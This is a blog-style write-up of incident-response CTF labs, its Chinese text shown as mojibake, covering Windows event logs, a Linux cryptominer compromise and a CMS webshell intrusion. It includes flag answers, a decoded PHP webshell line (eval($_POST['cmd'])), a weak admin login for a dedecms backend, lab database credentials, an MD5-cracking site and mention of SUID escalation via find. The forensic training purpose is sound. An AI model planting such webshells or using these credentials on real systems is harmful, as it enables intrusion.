<h4 id="ä»»åŠ¡å››-9"><a href="#ä»»åŠ¡å››-9" class="headerlink" title="ä»»åŠ¡å››"></a>ä»»åŠ¡å››</h4><p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-06-07/f7a734496dc1b62649fdfbe75ba6b1d4--a99f--image-20240607170316227.png" alt="image-20240607170316227"></p>
<h4 id="ä»»åŠ¡äº”-5"><a href="#ä»»åŠ¡äº”-5" class="headerlink" title="ä»»åŠ¡äº”"></a>ä»»åŠ¡äº”</h4><p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-06-07/d542768c05edb59f0e430e618fd1e051--3ed2--image-20240607170350816.png" alt="image-20240607170350816"></p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-06-07/6c4271836480a8fdcdee5f4cdafa562e--e949--image-20240607170415685.png" alt="image-20240607170415685"></p>
<h1 id="ç¬¬äº”ç« -linuxå®æˆ˜"><a href="#ç¬¬äº”ç« -linuxå®æˆ˜" class="headerlink" title="ç¬¬äº”ç« -linuxå®æˆ˜"></a>ç¬¬äº”ç« -linuxå®æˆ˜</h1><h2 id="Windows-å®æˆ˜-evtx-æ–‡ä»¶åˆ†æ"><a href="#Windows-å®æˆ˜-evtx-æ–‡ä»¶åˆ†æ" class="headerlink" title="Windows å®æˆ˜-evtx æ–‡ä»¶åˆ†æ"></a>Windows å®æˆ˜-evtx æ–‡ä»¶åˆ†æ</h2><h4 id="ä»»åŠ¡ä¸€-11"><a href="#ä»»åŠ¡ä¸€-11" class="headerlink" title="ä»»åŠ¡ä¸€"></a>ä»»åŠ¡ä¸€</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.å°†é»‘å®¢æˆåŠŸç™»å½•ç³»ç»Ÿæ‰€ä½¿ç”¨çš„IPåœ°å€ä½œä¸ºFlagå€¼æäº¤ï¼›</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;192.168.36.133&#125;</span><br></pre></td></tr></table></figure>

<p>ç­›é€‰å®‰å…¨æ—¥å¿—4624ï¼Œç™»å½•æˆåŠŸï¼Œæ‰¾æœ€æ—©ç™»å½•çš„</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-06-08/789b239a393078b146d31452deb1381c--3380--image-20240608211122498.png" alt="image-20240608211122498"></p>
<p>ä½¿ç”¨æ—¥å¿—åˆ†æå·¥å…·ï¼Œç­›é€‰è¿œç¨‹ç™»å½•å³å¯å¿«é€Ÿæ‰¾åˆ°</p>
<h4 id="ä»»åŠ¡äºŒ-10"><a href="#ä»»åŠ¡äºŒ-10" class="headerlink" title="ä»»åŠ¡äºŒ"></a>ä»»åŠ¡äºŒ</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">2.é»‘å®¢æˆåŠŸç™»å½•ç³»ç»Ÿåä¿®æ”¹äº†ç™»å½•ç”¨æˆ·çš„ç”¨æˆ·åï¼Œå°†ä¿®æ”¹åçš„ç”¨æˆ·åä½œä¸ºFlagå€¼æäº¤ï¼›</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;Adnimistartro&#125;</span><br></pre></td></tr></table></figure>

<p>ä¸»è¦å°±æ˜¯æ‰¾ç”¨æˆ·ç™»å½•çš„æ—¥å¿—å³å¯</p>
<p>ç­›é€‰å®‰å…¨æ—¥å¿—4781ï¼Œè´¦æˆ·åç§°å·²æ›´æ”¹</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-06-08/c87f0e6fdd7623ecf96ed094dccc791a--81ad--image-20240608213752997.png" alt="image-20240608213752997"></p>
<p>ä½¿ç”¨äº‹ä»¶idèƒ½å¤Ÿæ›´å¿«çš„å»åˆ†æ</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-06-08/d8913a3327f68cad8a53798b7e49e544--c04c--image-20240608212250620.png" alt="image-20240608212250620"></p>
<p>é‡Œé¢æ··äº†ä¸€ä¸ªè¿™ä¸ä¸€æ ·çš„</p>
<h4 id="ä»»åŠ¡ä¸‰-10"><a href="#ä»»åŠ¡ä¸‰-10" class="headerlink" title="ä»»åŠ¡ä¸‰"></a>ä»»åŠ¡ä¸‰</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">3.é»‘å®¢æˆåŠŸç™»å½•ç³»ç»ŸåæˆåŠŸè®¿é—®äº†ä¸€ä¸ªå…³é”®ä½ç½®çš„æ–‡ä»¶ï¼Œå°†è¯¥æ–‡ä»¶åç§°ï¼ˆæ–‡ä»¶åç§°ä¸åŒ…å«åç¼€ï¼‰ä½œä¸ºFlagå€¼æäº¤ï¼›</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SCHEMA</span><br></pre></td></tr></table></figure>

<p>ç­›é€‰å®‰å…¨æ—¥å¿—4663ï¼Œå°è¯•è®¿é—®å¯¹è±¡	æ£€æµ‹æœªç»æˆæƒè®¿é—®æ–‡ä»¶å’Œæ–‡ä»¶å¤¹çš„è¡Œä¸º</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-06-08/b70999143b396ba6cc0ea78373df1b77--d89f--image-20240608213623215.png" alt="image-20240608213623215"></p>
<h4 id="ä»»åŠ¡å››-10"><a href="#ä»»åŠ¡å››-10" class="headerlink" title="ä»»åŠ¡å››"></a>ä»»åŠ¡å››</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">4.é»‘å®¢æˆåŠŸç™»å½•ç³»ç»Ÿåé‡å¯è¿‡å‡ æ¬¡æ•°æ®åº“æœåŠ¡ï¼Œå°†æœ€åä¸€æ¬¡é‡å¯æ•°æ®åº“æœåŠ¡åæ•°æ®åº“æœåŠ¡çš„è¿›ç¨‹IDå·ä½œä¸ºFlagå€¼æäº¤ï¼›</span><br></pre></td></tr></table></figure>

<p>æ ¹æ®ä¸Šè¿°é»‘å®¢æ”»å‡»çš„æ—¶é—´æ®µï¼Œä¸º2020å¹´10æœˆ8æ—¥ ç­›é€‰åº”ç”¨ç¨‹åºæ—¥å¿—è®°å½•æ—¶é—´ä¸º2020å¹´10æœˆ8æ—¥ï¼Œæ¥äº‹ä»¶æºä¸ºMySQL</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-06-08/773c399f7c6d0f4b468cc145d4cfad9e--9277--image-20240608214745960.png" alt="image-20240608214745960"></p>
<p>ç„¶åå†æœç´¢startæ‰¾åˆ°æœ€åä¸€æ¬¡å¯åŠ¨mysql</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-06-08/954d96fe2e07e030f079c85de7700b57--1fb4--image-20240608214808719.png" alt="image-20240608214808719"></p>
<p>flag{8820}</p>
<h4 id="ä»»åŠ¡äº”-6"><a href="#ä»»åŠ¡äº”-6" class="headerlink" title="ä»»åŠ¡äº”"></a>ä»»åŠ¡äº”</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">5.é»‘å®¢æˆåŠŸç™»å½•ç³»ç»Ÿåä¿®æ”¹äº†ç™»å½•ç”¨æˆ·çš„ç”¨æˆ·åå¹¶å¯¹ç³»ç»Ÿæ‰§è¡Œäº†å¤šæ¬¡é‡å¯æ“ä½œï¼Œå°†é»‘å®¢ä½¿ç”¨ä¿®æ”¹åçš„ç”¨æˆ·é‡å¯ç³»ç»Ÿçš„æ¬¡æ•°ä½œä¸ºFlagå€¼æäº¤ã€‚xxxxxxxxxxÂ 5.é»‘å®¢æˆåŠŸç™»å½•ç³»ç»Ÿåä¿®æ”¹äº†ç™»å½•ç”¨æˆ·çš„ç”¨æˆ·åå¹¶å¯¹ç³»ç»Ÿæ‰§è¡Œäº†å¤šæ¬¡é‡å¯æ“ä½œï¼Œå°†é»‘å®¢ä½¿ç”¨ä¿®æ”¹åçš„ç”¨æˆ·é‡å¯ç³»ç»Ÿçš„æ¬¡æ•°ä½œä¸ºFlagå€¼æäº¤ã€‚</span><br></pre></td></tr></table></figure>

<p>ç­›é€‰ç³»ç»Ÿæ—¥å¿—1074ï¼Œè®¡ç®—æœºå¼€æœºã€å…³æœºã€é‡å¯çš„æ—¶é—´ã€åŸå› ã€æ³¨é‡Š</p>
<p>è®¡ç®—æœºä¸ºWIN-B1B1T3K57G9</p>
<p>CTRL+F æœç´¢Administratroï¼Œæ‰¾å¯¹æˆå¯¹çš„è®°å½•ï¼Œ2æ¬¡é‡å¯ï¼Œ1æ¬¡å…³æœº</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-06-08/82df434b76f042e17fa2e451ad457725--0ad8--image-20240608215308905.png" alt="image-20240608215308905"></p>
<p>ä¹Ÿå°±æ˜¯ä¸‰å¯¹</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;3&#125;</span><br></pre></td></tr></table></figure>

<h2 id="linuxå®æˆ˜-æŒ–çŸ¿"><a href="#linuxå®æˆ˜-æŒ–çŸ¿" class="headerlink" title="linuxå®æˆ˜-æŒ–çŸ¿"></a>linuxå®æˆ˜-æŒ–çŸ¿</h2><h4 id="ä»»åŠ¡ä¸€-12"><a href="#ä»»åŠ¡ä¸€-12" class="headerlink" title="ä»»åŠ¡ä¸€"></a>ä»»åŠ¡ä¸€</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">é»‘å®¢çš„IPæ˜¯ï¼Ÿ flagæ ¼å¼ï¼šflag&#123;é»‘å®¢çš„ipåœ°å€&#125;ï¼Œå¦‚ï¼šflag&#123;127.0.0.1&#125;</span><br></pre></td></tr></table></figure>

<p>ç›´æ¥å°±æ˜¯æŸ¥çœ‹æ—¥å¿—å³å¯ï¼Œå…¨éƒ½æ˜¯é»‘å®¢çš„ip</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/www/admin/websec_80/log/nginx_access_2023-12-22.log</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;192.168.10.135&#125;</span><br></pre></td></tr></table></figure>

<h4 id="ä»»åŠ¡äºŒ-11"><a href="#ä»»åŠ¡äºŒ-11" class="headerlink" title="ä»»åŠ¡äºŒ"></a>ä»»åŠ¡äºŒ</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">é»‘å®¢æ”»é™·ç½‘ç«™çš„å…·ä½“æ—¶é—´æ˜¯ï¼Ÿ flagæ ¼å¼ï¼šflag&#123;å¹´-æœˆ-æ—¥ æ—¶:åˆ†:ç§’&#125;ï¼Œå¦‚ï¼šflag&#123;2023-12-24 22:23:24&#125;</span><br></pre></td></tr></table></figure>

<p>dedecmså¼±å£ä»¤è¿›å…¥åå°ï¼š<a href="http://43.192.51.123:8081/dede/login.php?gotopage=/dede/">http://43.192.51.123:8081/dede/login.php?gotopage=%2Fdede%2F</a></p>
<p>è¿™é‡Œå¯ä»¥é€šè¿‡æ—¥å¿—å»çœ‹å‡ºæ¥ï¼Œå¯†ç å¯ä»¥çˆ†ç ´ä¸€ä¸‹å³å¯</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">admin    12345678</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-06-10/ffe0ac99a34217da0e4dcf771b77c245--e63c--image-20240610134100632.png" alt="image-20240610134100632"></p>
<p>åœ¨è´¦å·å¤„å‘ç°é»‘å®¢çš„ç”¨æˆ·</p>
<p>å³å¯çŸ¥é“å¯¹åº”çš„æ—¶é—´</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;2023-12-22 19:08:34&#125;</span><br></pre></td></tr></table></figure>

<h4 id="ä»»åŠ¡ä¸‰-11"><a href="#ä»»åŠ¡ä¸‰-11" class="headerlink" title="ä»»åŠ¡ä¸‰"></a>ä»»åŠ¡ä¸‰</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">é»‘å®¢ä¸Šä¼ webshellçš„åç§°åŠå¯†ç æ˜¯ï¼Ÿ flagæ ¼å¼ï¼šflag&#123;é»‘å®¢ä¸Šä¼ çš„webshellåç§°-webshellå¯†ç &#125;ï¼Œå¦‚ï¼šflag&#123;webshell.php-pass&#125;</span><br></pre></td></tr></table></figure>

<p>ç›´æ¥å°±æ˜¯å°†ç½‘ç«™æºç pushä¸‹æ¥ä½¿ç”¨dç›¾å»æ‰«æä¸€ä¸‹</p>
<p>ç›´æ¥å°±èƒ½æœ‰äº†</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-06-10/a93fe2d838ff17c84e8d9b1bae653ef2--7363--image-20240610140120996.png" alt="image-20240610140120996"></p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-06-10/a5e7da53acd4c883bc5778726e753ca0--9166--image-20240610140148993.png" alt="image-20240610140148993"></p>
<p>æœ¬åœ°è·‘ä¸€ä¸‹è¿™ä¸€æ®µå³å¯</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">string(20) &quot;eval($_POST[&#x27;cmd&#x27;]);&quot;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;404.php-cmd&#125;</span><br></pre></td></tr></table></figure>

<h4 id="ä»»åŠ¡å››-11"><a href="#ä»»åŠ¡å››-11" class="headerlink" title="ä»»åŠ¡å››"></a>ä»»åŠ¡å››</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">é»‘å®¢ææƒåè®¾ç½®çš„åé—¨æ–‡ä»¶åç§°æ˜¯ï¼Ÿ flagæ ¼å¼ï¼šflag&#123;åé—¨æ–‡ä»¶ç»å¯¹è·¯å¾„åŠ ä¸Šåç§°&#125;ï¼Œå¦‚ï¼šflag&#123;/etc/passwd&#125;</span><br></pre></td></tr></table></figure>

<p>ç›´æ¥ä½¿ç”¨historyå‘½ä»¤æŸ¥çœ‹å†å²å‘½ä»¤æ‰§è¡Œ</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-06-10/f4986b2bc6d72d8634948ccf456b8007--7a1d--image-20240610135029337.png" alt="image-20240610135029337"></p>
<p>å‘ç°æ˜¯ä½¿ç”¨äº†suidææƒfindå‘½ä»¤</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;/usr/bin/find&#125;</span><br></pre></td></tr></table></figure>

<h4 id="ä»»åŠ¡äº”-7"><a href="#ä»»åŠ¡äº”-7" class="headerlink" title="ä»»åŠ¡äº”"></a>ä»»åŠ¡äº”</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">å¯¹é»‘å®¢ä¸Šä¼ çš„æŒ–çŸ¿ç—…æ¯’è¿›è¡Œåˆ†æï¼Œè·å–éšè—çš„Flag</span><br></pre></td></tr></table></figure>

<p>æŒ–çŸ¿ç—…æ¯’çš„è¯ä¸€èˆ¬æƒ…å†µéƒ½æ˜¯è®¡åˆ’ä»»åŠ¡ä¸­å®šæ—¶æ‰§è¡Œï¼Œæˆ‘ä»¬å°±å»æŸ¥çœ‹ä¸€ä¸‹è®¡åˆ’ä»»åŠ¡</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-06-10/6f8f04b805135fadd166d5b361a99ac0--a514--image-20240610135737910.png" alt="image-20240610135737910"></p>
<p>å‘ç°ä¸‹è½½äº†ä¸€ä¸ªldmä¼°è®¡å°±æ˜¯æŒ–çŸ¿ç¨‹åºäº†</p>
<p>æŸ¥æ‰¾ä¸€ä¸‹</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-06-10/a9a779b045aa7bc68764a75b153e94cf--dab2--image-20240610135810644.png" alt="image-20240610135810644"></p>
<p>çœ‹åˆ°å¾ˆæ˜æ˜¾çš„base64ç¼–ç </p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-06-10/ccdc5a343929cbf9d186e9224e0fd139--6ea5--image-20240610135903751.png" alt="image-20240610135903751"></p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-06-10/db4d266e8ba5c5650817e1e597e2e234--c9cb--image-20240610135942248.png" alt="image-20240610135942248"></p>
<p>è§£ç æˆåŠŸè·å¾—flag</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;websec_True@888!&#125;</span><br></pre></td></tr></table></figure>

<h2 id="linuxå®æˆ˜-æŒ–çŸ¿-äºŒ"><a href="#linuxå®æˆ˜-æŒ–çŸ¿-äºŒ" class="headerlink" title="linuxå®æˆ˜-æŒ–çŸ¿ äºŒ"></a>linuxå®æˆ˜-æŒ–çŸ¿ äºŒ</h2><p>ç™¾åº¦ç½‘ç›˜é™„ä»¶ï¼Œä¸‹çš„è´¼æ…¢</p>
<h2 id="linuxå®æˆ˜-CMS01"><a href="#linuxå®æˆ˜-CMS01" class="headerlink" title="linuxå®æˆ˜-CMS01"></a>linuxå®æˆ˜-CMS01</h2><h4 id="ä»»åŠ¡ä¸€-13"><a href="#ä»»åŠ¡ä¸€-13" class="headerlink" title="ä»»åŠ¡ä¸€"></a>ä»»åŠ¡ä¸€</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">é€šè¿‡æœ¬åœ° PC SSHåˆ°æœåŠ¡å™¨å¹¶ä¸”åˆ†æé»‘å®¢çš„ IP ä¸ºå¤šå°‘,å°†é»‘å®¢ IP ä½œä¸º FLAG æäº¤;</span><br></pre></td></tr></table></figure>

<p>ç›´æ¥å°±æ˜¯æŸ¥çœ‹æœ€è¿‘çš„ç™»å½•æ—¥å¿—å³å¯</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">grep &quot;Accepted &quot; /var/log/secure | awk &#x27;&#123;print $1,$2,$3,$9,$11&#125;&#x27;</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-06-11/030803d92fe4fb1af15067cb2a4e416b--01fa--image-20240611202335297.png" alt="image-20240611202335297"></p>
<p>å³å¯å¾—çŸ¥é»‘å®¢çš„ipæ˜¯</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;192.168.20.1&#125;</span><br></pre></td></tr></table></figure>

<h4 id="ä»»åŠ¡äºŒ-12"><a href="#ä»»åŠ¡äºŒ-12" class="headerlink" title="ä»»åŠ¡äºŒ"></a>ä»»åŠ¡äºŒ</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">é€šè¿‡æœ¬åœ° PC SSHåˆ°æœåŠ¡å™¨å¹¶ä¸”åˆ†æé»‘å®¢ä¿®æ”¹çš„ç®¡ç†å‘˜å¯†ç (æ˜æ–‡)ä¸ºå¤šå°‘,å°†é»‘å®¢ä¿®æ”¹çš„ç®¡ç†å‘˜å¯†ç (æ˜æ–‡) ä½œä¸º FLAG æäº¤;</span><br></pre></td></tr></table></figure>

<p>æˆ‘ä»¬é¦–å…ˆå°±æ˜¯å¯ä»¥å»æŸ¥çœ‹ä¸€ä¸‹æœ‰å“ªäº›æœåŠ¡è¿è¡Œäº†</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">netstat -anlupt</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-06-11/1ea770786533a9acc850a125a6e28671--71f8--image-20240611202954349.png" alt="image-20240611202954349"></p>
<p>å‘ç°mysqlæœåŠ¡ï¼Œè¿™ä¸ªæ—¶å€™æˆ‘ä»¬å°±å¯ä»¥å»å¯»æ‰¾ä¸€ä¸‹mysqlçš„é…ç½®æ–‡ä»¶æ‹¿åˆ°è´¦å·å¯†ç </p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-06-11/a43857bfc91d13c59f6ba9964b4eda01--2a57--image-20240611203209610.png" alt="image-20240611203209610"></p>
<p>æˆåŠŸæ‰¾åˆ°å¯¹åº”çš„è´¦å·å¯†ç </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/www/wwwroot/127.0.0.1/lib/config.inc.php</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kaoshi 5Sx8mK5ieyLPb84m</span><br></pre></td></tr></table></figure>

<p>ç„¶åå°±å¯ä»¥å»è¿æ¥mysqlæ•°æ®åº“</p>
<p>å»æŸ¥è¯¢</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-06-11/41cf245043261c63da29016311d8286b--2445--image-20240611203950735.png" alt="image-20240611203950735"></p>
<p>å‘ç°idä¸º1çš„ä¸ºç®¡ç†å‘˜</p>
<p>ç„¶åå°±æ˜¯å†å»æŸ¥è¯¢ç”¨æˆ·</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from x2_user</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-06-11/8db50c668863c8efed04fbecf433bf35--c0cd--image-20240611204045800.png"></p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-06-11/2d21c3ba1feb1f92c405cf801ef02d00--84d9--image-20240611204250756.png" alt="image-20240611204250756"></p>
<p>æˆåŠŸæ‹¿åˆ°æ˜æ–‡å¯†ç </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">è¿™é‡Œæ¨èä¸€ä¸ªmd5è§£å¯†çš„ç½‘ç«™ï¼Œhttps://www.chamd5.org/</span><br><span class="line">æ¯”cmd5å¥½ç”¨ä¸å°‘ï¼Œä¸»è¦æ˜¯ä¸ç”¨ä¼šå‘˜å•¥çš„</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Network@2020</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;Network@2020&#125;</span><br></pre></td></tr></table></figure>

<h4 id="ä»»åŠ¡ä¸‰-12"><a href="#ä»»åŠ¡ä¸‰-12" class="headerlink" title="ä»»åŠ¡ä¸‰"></a>ä»»åŠ¡ä¸‰</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">é€šè¿‡æœ¬åœ° PC SSHåˆ°æœåŠ¡å™¨å¹¶ä¸”åˆ†æé»‘å®¢ç¬¬ä¸€æ¬¡Webshellçš„è¿æ¥URLä¸ºå¤šå°‘,å°†é»‘å®¢ç¬¬ä¸€æ¬¡Webshellçš„è¿æ¥URLä½œä¸º FLAG æäº¤(æ— éœ€åŸŸåflag&#123;xxx.php?abc-app-upload&#125;);</span><br></pre></td></tr></table></figure>

<p>åœ¨rootç›®å½•ä¸‹å‘ç°äº†æœ‰æ•°æ®åŒ…ï¼Œæˆ‘ä»¬å°±å¯ä»¥ä½¿ç”¨wiresharkå»åˆ†æä¸€ä¸‹</p>
<p>ç›´æ¥å°±æ˜¯èƒ½å¤Ÿå‘ç°è¿æ¥çš„URL</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-06-11/8e418260cd13c3f85a66c69f03ffe40a--42db--image-20240611205455562.png" alt="image-20240611205455562"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;index.php?user-app-register&#125;</span><br></pre></td></tr></table></figure>

<h4 id="ä»»åŠ¡å››-12"><a href="#ä»»åŠ¡å››-12" class="headerlink" title="ä»»åŠ¡å››"></a>ä»»åŠ¡å››</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">é€šè¿‡æœ¬åœ° PC SSHåˆ°æœåŠ¡å™¨å¹¶ä¸”åˆ†æé»‘å®¢Webshellè¿æ¥å¯†ç å¤šå°‘,å°†é»‘å®¢Webshellè¿æ¥å¯†ç  ä½œä¸º FLAG æäº¤;</span><br></pre></td></tr></table></figure>

<p>ç›´æ¥å°±æ˜¯è¿½è¸ªæµï¼Œå‘ç°</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-06-11/2e9728879ae6432bc318de2ad15c17cf--acfb--image-20240611205832288.png" alt="image-20240611205832288"></p>
<p>è§£ç ä¸€ä¸‹ï¼Œå¾—åˆ°å¯¹åº”çš„ä»£ç </p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-06-11/e07df31824831bd5fe3ad4d77ac1b929--2974--image-20240611205855950.png" alt="image-20240611205855950"></p>
<p>åˆ†æå¯ä»¥å‘ç°æ˜¯</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">@ini_set(&quot;display_errors&quot;,&quot;0&quot;);è¿™æ®µä»£ç åŸºæœ¬æ˜¯æ‰€æœ‰WebShellå®¢æˆ·ç«¯é“¾æ¥PHPç±»</span><br></pre></td></tr></table></figure>

<p>æ‰€ä»¥å°±æ˜¯å¯ä»¥çŸ¥é“å¯†ç å°±æ˜¯</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Network2020</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;Network2020&#125;</span><br></pre></td></tr></table></figure>

<h4 id="ä»»åŠ¡äº”-8"><a href="#ä»»åŠ¡äº”-8" class="headerlink" title="ä»»åŠ¡äº”"></a>ä»»åŠ¡äº”</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">é€šè¿‡æœ¬åœ° PC SSHåˆ°æœåŠ¡å™¨å¹¶ä¸”åˆ†æé»‘å®¢ä½¿ç”¨çš„åç»­ä¸Šä¼ çš„æœ¨é©¬æ–‡ä»¶åç§°ä¸ºå¤šå°‘,å°†é»‘å®¢ä½¿ç”¨çš„åç»­ä¸Šä¼ çš„æœ¨é©¬æ–‡ä»¶åç§° ä½œä¸º FLAG æäº¤;</span><br></pre></td></tr></table></figure>

<p>å°±åœ¨æµé‡åˆ†æç•Œé¢å¾ˆå®¹æ˜“èƒ½å¤Ÿå‘ç°å°±æ˜¯version2.phpè¿™ä¸ªæ–‡ä»¶</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-06-11/55db29fbf9f30be4a6a065d17fbb87e7--e074--image-20240611210621885.png" alt="image-20240611210621885"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;version2.php&#125;</span><br></pre></td></tr></table></figure>

<h4 id="ä»»åŠ¡å…­-1"><a href="#ä»»åŠ¡å…­-1" class="headerlink" title="ä»»åŠ¡å…­"></a>ä»»åŠ¡å…­</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">é€šè¿‡æœ¬åœ° PC SSHåˆ°æœåŠ¡å™¨å¹¶ä¸”åˆ†æé»‘å®¢éšè—çš„flag2,å°†é»‘å®¢ä½¿éšè—çš„flag2 ä½œä¸º FLAG æäº¤;</span><br></pre></td></tr></table></figure>

<p>æ¢³ç†ä¸€ä¸‹å‰é¢çš„å†…å®¹</p>
<p>æ”»å‡»åœ¨<code>/www/wwwroot/127.0.0.1/</code>ç›®å½•ä¸‹åˆ›å»ºäº†<code>flag1</code> æ–‡ä»¶å¹¶å†™å…¥flagï¼Œç„¶åå†™å…¥ä¸€ä¸ªæ–°çš„æœ¨é©¬ï¼Œå†æ”¹åä¸º<code>version2.php</code></p>
<p>è¿™é‡Œæˆ‘ä»¬çŒœæµ‹å°±æ˜¯ä¸Šä¼ æœ¨é©¬åå»getshelläº†ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨historyæŸ¥çœ‹ä¸€ä¸‹å‘½ä»¤æ‰§è¡Œ</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-06-11/7a0f175ce4e9658d05cdfae0e5c500dc--b780--image-20240611212251131.png" alt="image-20240611212251131"></p>
<p>å‘ä¿¡åº”è¯¥å°±æ˜¯åœ¨mpnotify.phpä¸­</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat /www/wwwroot/127.0.0.1/.api/alinotify.php</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-06-11/91b74a52023726921803dd184dd2037f--adf1--image-20240611212454084.png" alt="image-20240611212454084"></p>
<p>æˆåŠŸæ‹¿åˆ°flag</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;bL5Frin6JVwVw7tJBdqXlHCMVpAenXI9In9&#125;</span><br></pre></td></tr></table></figure>

<h4 id="ä»»åŠ¡ä¸ƒ"><a href="#ä»»åŠ¡ä¸ƒ" class="headerlink" title="ä»»åŠ¡ä¸ƒ"></a>ä»»åŠ¡ä¸ƒ</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">é€šè¿‡æœ¬åœ° PC SSHåˆ°æœåŠ¡å™¨å¹¶ä¸”åˆ†æé»‘å®¢éšè—çš„flag3,å°†é»‘å®¢ä½¿éšè—çš„flag3 ä½œä¸º FLAG æäº¤;</span><br></pre></td></tr></table></figure>

<p>åˆšåˆšä¸Šé¢ä¹Ÿæ˜¯ç›´æ¥çœ‹åˆ°äº†çš„</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;5LourqoFt5d2zyOVUoVPJbOmeVmoKgcy6OZ&#125;</span><br></pre></td></tr></table></figure>

